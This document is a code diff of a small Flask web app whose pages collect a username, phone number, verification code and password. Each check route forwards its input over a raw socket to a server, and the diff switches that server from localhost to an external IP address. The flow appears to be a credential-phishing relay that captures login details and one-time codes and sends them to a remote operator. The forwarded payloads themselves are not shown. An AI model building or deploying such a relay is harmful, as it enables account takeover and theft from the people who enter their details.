@@ -1,16 +1,15 @@
 from flask import Flask, render_template, request
-from server.session import Session
 import socket
 
 app = Flask(__name__)
 
 Sessions = {}
-host = "localhost"
+host = "193.124.65.30"
 port = 50000
 
 
 @app.route('/')
-async def index():
+def index():
     request_username = request.args.get('username')
     request_phone = request.args.get('phone')
     if request_username and request_username != '' and request_phone and request_phone != '':
@@ -22,7 +21,7 @@ async def index():
 
 
 @app.route('/code')
-async def code():
+def code():
     request_username = request.args.get('username')
     request_phone = request.args.get('phone')
     if request_username and request_username != '' and request_phone and request_phone != '':
@@ -32,7 +31,7 @@ async def code():
 
 
 @app.route('/password')
-async def password():
+def password():
     request_username = request.args.get('username')
     if request_username and request_username != '':
         return render_template("password/password.html", username=request_username)
@@ -41,7 +40,7 @@ async def password():
 
 
 @app.route('/check_number/<jsdata>')
-async def send_code(jsdata):
+def send_code(jsdata):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
@@ -55,7 +54,7 @@ async def send_code(jsdata):
 
 
 @app.route('/check_code/<jsdata>')
-async def check_code(jsdata):
+def check_code(jsdata):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
@@ -70,7 +69,7 @@ async def check_code(jsdata):
 
 
 @app.route('/password_check/<jsdata>')
-async def password_check(jsdata):
+def password_check(jsdata):
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((host, port))
